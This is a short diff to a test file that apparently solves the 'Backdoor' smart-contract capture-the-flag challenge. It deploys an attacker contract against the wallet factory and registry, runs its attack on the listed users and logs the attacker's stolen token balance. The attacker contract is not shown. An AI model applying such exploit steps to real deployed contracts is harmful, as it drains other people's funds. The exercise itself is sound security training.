@@ -37,6 +37,15 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.backdoorAttacker = await (await ethers.getContractFactory("BackdoorAttacker", attacker)).deploy(
+            this.masterCopy.address,
+            this.walletFactory.address,
+            this.walletRegistry.address,
+            this.token.address
+        )
+
+        await this.backdoorAttacker.connect(attacker).attack(users);
+        console.log("Attacker DVT balance after attack: ", String(await this.token.balanceOf(attacker.address) / (10 ** 18)));
     });
 
     after(async function () {
